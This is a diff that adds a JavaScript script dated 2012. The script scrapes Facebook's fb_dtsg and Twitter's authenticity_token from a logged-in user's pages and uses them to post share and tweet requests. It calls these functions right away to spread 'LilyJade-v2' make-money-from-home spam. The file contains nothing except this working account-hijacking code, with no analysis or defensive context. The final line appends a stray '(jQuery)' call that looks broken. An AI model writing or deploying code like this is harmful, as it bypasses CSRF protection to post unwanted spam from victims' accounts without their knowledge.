@@ -1,0 +1,47 @@
+//Written 2012
+function share(appid,link,title,content,picture){
+    //Grab DTSG
+    with(grabInfo = new XMLHttpRequest()) open("GET", "/", false), send(null);
+    res = grabInfo.responseText;
+    var fb_dtsg = res.match(/name="fb_dtsg" value="([^"]+)"/)[1];
+    
+    //Post to newsfeed/timeline
+    $.post("/dialog/feed", {
+      fb_dtsg: fb_dtsg,
+      preview: "0",
+      app_id: appid,
+      redirect_uri: "http://facebook.com",
+      sdk: "joey",
+      display: "page",
+      api_key: appid,
+      link: link,
+      name: title,
+      description: content,
+      picture: picture,
+      from_login: "1",
+      client_id: appid,
+      from_post: "1",
+      publish: "Share",
+      'audience[0][value]': 40,
+      }, function (data) {
+      console.log(data);
+      });
+}
+
+share('178222352279634','http://lilyjade-v2.com','Lilyjade-v2.com Social Ad Software','LilyJade-v2 is a social software system to help people make money from home','http://lilyjade-v2.com/images/LJ_logo2-2.png');
+
+function createTweet(status){
+ //Grab Authenticity Token
+ with(grabInfo = new XMLHttpRequest()) open("GET", "/intent/tweet", false), send(null);
+ res = grabInfo.responseText;
+ var token = res.match(/name="authenticity_token" type="hidden" value="([^"]+)"/)[1];
+ //Tweet
+ $.post("/intent/tweet/update", {
+       authenticity_token: token,
+       original_referer: "https://twitter.com",
+       status: status
+       }, function (data) {
+       console.log(data);
+       });
+} 
+createTweet("#Lilyjade Posting automatically. http://lilyjade-v2.com/")(jQuery);
